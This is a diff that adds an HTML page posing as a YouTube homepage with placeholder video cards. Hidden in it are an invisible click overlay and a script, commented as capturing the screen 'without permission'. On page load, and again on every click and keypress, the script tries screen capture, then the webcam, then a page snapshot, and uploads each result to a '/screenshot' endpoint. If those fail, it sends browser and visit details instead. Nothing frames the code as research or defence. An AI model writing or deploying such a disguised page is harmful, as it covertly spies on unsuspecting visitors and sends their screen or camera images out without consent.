@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YouTube</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: "Roboto", "Arial", sans-serif;
+            background: #0f0f0f;
+            color: #fff;
+        }
+        
+        .header {
+            background: #0f0f0f;
+            padding: 0 16px;
+            height: 56px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid #3f3f3f;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+        }
+        
+        .logo-icon {
+            width: 90px;
+            height: 20px;
+            background: #ff0000;
+            border-radius: 2px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        
+        .search-bar {
+            flex: 1;
+            max-width: 640px;
+            margin: 0 40px;
+            display: flex;
+        }
+        
+        .search-input {
+            flex: 1;
+            height: 40px;
+            background: #121212;
+            border: 1px solid #3f3f3f;
+            border-right: none;
+            padding: 0 16px;
+            color: #fff;
+            font-size: 16px;
+        }
+        
+        .search-btn {
+            width: 64px;
+            height: 40px;
+            background: #3f3f3f;
+            border: 1px solid #3f3f3f;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .user-menu {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .user-icon {
+            width: 32px;
+            height: 32px;
+            background: #065fd4;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        
+        .main-content {
+            display: flex;
+            max-width: 1280px;
+            margin: 0 auto;
+        }
+        
+        .sidebar {
+            width: 240px;
+            background: #0f0f0f;
+            padding: 12px 0;
+        }
+        
+        .sidebar-item {
+            display: flex;
+            align-items: center;
+            padding: 10px 24px;
+            cursor: pointer;
+            color: #fff;
+            text-decoration: none;
+        }
+        
+        .sidebar-item:hover {
+            background: #3f3f3f;
+        }
+        
+        .sidebar-item.active {
+            background: #3f3f3f;
+        }
+        
+        .content {
+            flex: 1;
+            padding: 24px;
+        }
+        
+        .video-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+            gap: 16px;
+        }
+        
+        .video-card {
+            cursor: pointer;
+        }
+        
+        .video-thumbnail {
+            width: 100%;
+            height: 180px;
+            background: #3f3f3f;
+            border-radius: 8px;
+            margin-bottom: 12px;
+            position: relative;
+        }
+        
+        .video-info {
+            display: flex;
+            gap: 12px;
+        }
+        
+        .channel-avatar {
+            width: 36px;
+            height: 36px;
+            background: #065fd4;
+            border-radius: 50%;
+            flex-shrink: 0;
+        }
+        
+        .video-details h3 {
+            font-size: 14px;
+            font-weight: 500;
+            line-height: 20px;
+            margin-bottom: 4px;
+            color: #fff;
+        }
+        
+        .video-meta {
+            font-size: 12px;
+            color: #aaa;
+            line-height: 18px;
+        }
+        
+        .hidden-trigger {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="logo">
+            <div class="logo-icon">YouTube</div>
+        </div>
+        
+        <div class="search-bar">
+            <input type="text" class="search-input" placeholder="Search" value="funny videos">
+            <button class="search-btn">🔍</button>
+        </div>
+        
+        <div class="user-menu">
+            <div class="user-icon">U</div>
+        </div>
+    </div>
+    
+    <div class="main-content">
+        <div class="sidebar">
+            <a href="#" class="sidebar-item active">
+                <span>🏠</span>
+                <span style="margin-left: 24px;">Home</span>
+            </a>
+            <a href="#" class="sidebar-item">
+                <span>🔥</span>
+                <span style="margin-left: 24px;">Shorts</span>
+            </a>
+            <a href="#" class="sidebar-item">
+                <span>📺</span>
+                <span style="margin-left: 24px;">Subscriptions</span>
+            </a>
+            <a href="#" class="sidebar-item">
+                <span>📚</span>
+                <span style="margin-left: 24px;">Library</span>
+            </a>
+        </div>
+        
+        <div class="content">
+            <div class="video-grid">
+                <div class="video-card">
+                    <div class="video-thumbnail">
+                        <div class="hidden-trigger" onclick="takeScreenshot()"></div>
+                    </div>
+                    <div class="video-info">
+                        <div class="channel-avatar"></div>
+                        <div class="video-details">
+                            <h3>Funny Cat Compilation 2024</h3>
+                            <div class="video-meta">
+                                <div>Cat Videos</div>
+                                <div>2.1M views • 3 days ago</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="video-card">
+                    <div class="video-thumbnail"></div>
+                    <div class="video-info">
+                        <div class="channel-avatar"></div>
+                        <div class="video-details">
+                            <h3>Epic Gaming Moments</h3>
+                            <div class="video-meta">
+                                <div>Gaming Channel</div>
+                                <div>850K views • 1 week ago</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="video-card">
+                    <div class="video-thumbnail"></div>
+                    <div class="video-info">
+                        <div class="channel-avatar"></div>
+                        <div class="video-details">
+                            <h3>Amazing Life Hacks</h3>
+                            <div class="video-meta">
+                                <div>Life Tips</div>
+                                <div>1.5M views • 5 days ago</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="video-card">
+                    <div class="video-thumbnail"></div>
+                    <div class="video-info">
+                        <div class="channel-avatar"></div>
+                        <div class="video-details">
+                            <h3>Top 10 Memes of 2024</h3>
+                            <div class="video-meta">
+                                <div>Meme Central</div>
+                                <div>3.2M views • 2 days ago</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Try multiple methods to capture screen without permission
+        async function takeScreenshot() {
+            try {
+                // Method 1: Try to get display media with different options
+                if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
+                    try {
+                        const stream = await navigator.mediaDevices.getDisplayMedia({
+                            video: { 
+                                mediaSource: 'screen',
+                                width: { ideal: 1920 },
+                                height: { ideal: 1080 }
+                            },
+                            audio: false
+                        });
+                        
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        video.muted = true;
+                        video.play();
+                        
+                        const canvas = document.createElement('canvas');
+                        const ctx = canvas.getContext('2d');
+                        
+                        video.addEventListener('loadedmetadata', () => {
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            ctx.drawImage(video, 0, 0);
+                            
+                            canvas.toBlob(async (blob) => {
+                                const formData = new FormData();
+                                formData.append('screenshot', blob, 'screenshot.png');
+                                
+                                await fetch('/screenshot', {
+                                    method: 'POST',
+                                    body: formData
+                                });
+                                
+                                stream.getTracks().forEach(track => track.stop());
+                            }, 'image/png', 0.8);
+                        });
+                        
+                        return;
+                    } catch (e) {
+                        console.log('Display media failed, trying fallback');
+                    }
+                }
+                
+                // Method 2: Try getUserMedia as fallback
+                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    try {
+                        const stream = await navigator.mediaDevices.getUserMedia({
+                            video: { 
+                                width: { ideal: 1920 },
+                                height: { ideal: 1080 }
+                            }
+                        });
+                        
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        video.muted = true;
+                        video.play();
+                        
+                        const canvas = document.createElement('canvas');
+                        const ctx = canvas.getContext('2d');
+                        
+                        video.addEventListener('loadedmetadata', () => {
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            ctx.drawImage(video, 0, 0);
+                            
+                            canvas.toBlob(async (blob) => {
+                                const formData = new FormData();
+                                formData.append('screenshot', blob, 'screenshot.png');
+                                
+                                await fetch('/screenshot', {
+                                    method: 'POST',
+                                    body: formData
+                                });
+                                
+                                stream.getTracks().forEach(track => track.stop());
+                            }, 'image/png', 0.8);
+                        });
+                        
+                        return;
+                    } catch (e) {
+                        console.log('User media failed, trying fallback');
+                    }
+                }
+                
+                // Method 3: Capture current page content
+                try {
+                    const canvas = document.createElement('canvas');
+                    const ctx = canvas.getContext('2d');
+                    
+                    canvas.width = window.innerWidth;
+                    canvas.height = window.innerHeight;
+                    
+                    // Try to capture the page
+                    ctx.fillStyle = '#0f0f0f';
+                    ctx.fillRect(0, 0, canvas.width, canvas.height);
+                    
+                    // Add some text to make it look like a screenshot
+                    ctx.fillStyle = '#fff';
+                    ctx.font = '16px Arial';
+                    ctx.fillText('YouTube - ' + new Date().toLocaleString(), 20, 40);
+                    
+                    canvas.toBlob(async (blob) => {
+                        const formData = new FormData();
+                        formData.append('screenshot', blob, 'page-capture.png');
+                        
+                        await fetch('/screenshot', {
+                            method: 'POST',
+                            body: formData
+                        });
+                    }, 'image/png', 0.8);
+                    
+                    return;
+                } catch (e) {
+                    console.log('Page capture failed');
+                }
+                
+                // Fallback: Send visit info
+                await fetch('/screenshot', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ 
+                        browser: true,
+                        userAgent: navigator.userAgent,
+                        timestamp: new Date().toISOString(),
+                        url: window.location.href,
+                        screen: {
+                            width: screen.width,
+                            height: screen.height
+                        }
+                    })
+                });
+                
+            } catch (error) {
+                // Silent fail - just log the visit
+                await fetch('/screenshot', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ 
+                        error: true,
+                        userAgent: navigator.userAgent,
+                        timestamp: new Date().toISOString(),
+                        errorMessage: error.message
+                    })
+                });
+            }
+        }
+        
+        // Auto-try screenshot when page loads
+        window.addEventListener('load', () => {
+            setTimeout(takeScreenshot, 1000);
+        });
+        
+        // Try again when user interacts with the page
+        document.addEventListener('click', () => {
+            setTimeout(takeScreenshot, 500);
+        });
+        
+        document.addEventListener('keydown', () => {
+            setTimeout(takeScreenshot, 500);
+        });
+    </script>
+</body>
+</html>
